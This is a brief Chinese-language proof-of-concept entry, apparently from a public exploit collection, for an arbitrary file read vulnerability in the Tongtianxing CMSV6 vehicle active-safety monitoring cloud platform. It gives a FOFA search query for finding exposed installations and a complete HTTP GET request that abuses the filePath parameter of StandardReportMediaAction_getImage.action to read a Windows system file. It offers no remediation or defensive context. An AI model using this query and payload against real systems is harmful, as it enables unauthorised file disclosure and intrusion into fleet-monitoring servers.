## 鸿运(通天星CMSV6车载)主动安全监控云平台存在任意文件读取漏洞

## fofa
```
body="./open/webApi.html"||body="/808gps/"
```

## poc
```
GET /808gps/StandardReportMediaAction_getImage.action?filePath=C://Windows//win.ini&fileOffset=1&fileSize=100 HTTP/1.1
Host:127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```

![image](https://github.com/wy876/POC/assets/139549762/4c7d4c08-d72f-477b-9604-f9cec433e39c)
